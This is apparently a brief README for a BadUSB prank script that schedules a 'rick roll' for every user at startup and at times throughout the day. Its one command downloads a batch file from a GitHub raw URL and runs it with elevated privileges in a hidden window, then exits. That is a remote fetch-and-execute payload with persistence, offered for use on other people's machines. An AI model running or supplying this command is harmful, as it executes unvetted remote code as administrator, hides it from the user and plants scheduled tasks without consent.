Uses task manager to rick roll every user on startup and occasinonly throughout the day
To run the following command into cmd prompt: 
Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Start.bat -OutFile .\Start.bat;Start-Process Start.bat -Verb runas -windowstyle hidden && exit
